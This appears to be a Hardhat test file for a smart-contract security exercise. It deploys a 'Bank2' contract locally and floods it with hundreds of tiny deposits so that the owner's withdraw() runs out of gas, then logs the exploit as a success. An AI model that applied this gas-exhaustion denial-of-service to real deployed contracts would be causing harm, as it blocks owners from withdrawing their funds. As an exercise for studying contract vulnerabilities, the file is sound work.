import '@nomiclabs/hardhat-ethers'
import { ethers } from 'hardhat'
import utils from '../utils'
import {Contract} from 'ethers'
import {SignerWithAddress} from "@nomiclabs/hardhat-ethers/dist/src/signer-with-address";

const fromEther = utils.fromEther
const toEther = utils.toEther

describe('Bank2', async () => {
    let owner: SignerWithAddress
    let user0: SignerWithAddress, user1: SignerWithAddress, user2: SignerWithAddress

    let bankContract: Contract

    before(async () => {
        [owner, user0, user1, user2, ] = await ethers.getSigners()

        const Bank = await ethers.getContractFactory("Bank2", owner)
        bankContract = await Bank.deploy()
    })

    it('disturb the bank2', async() => {
        // Deposit 3 users
        await bankContract.connect(user0).deposit({value: toEther(10000)})
        await bankContract.connect(user1).deposit({value: toEther(20000)})
        await bankContract.connect(user2).deposit({value: toEther(30000)})

        /////////////////////////////////////////////////////
        // TODO: Disturb the bank owner
        const signers = await ethers.getSigners()
        for (let i=4; i<300; i++){
            await bankContract.connect(signers[i]).deposit({value: toEther(0.0001)})
        }
        /////////////////////////////////////////////////////

        // The owner should fail to withdraw
        await utils.assertRevert(bankContract.connect(owner).withdraw()) // Transaction out of gas
        console.log("[Exploit Bank2] success")
    })
})
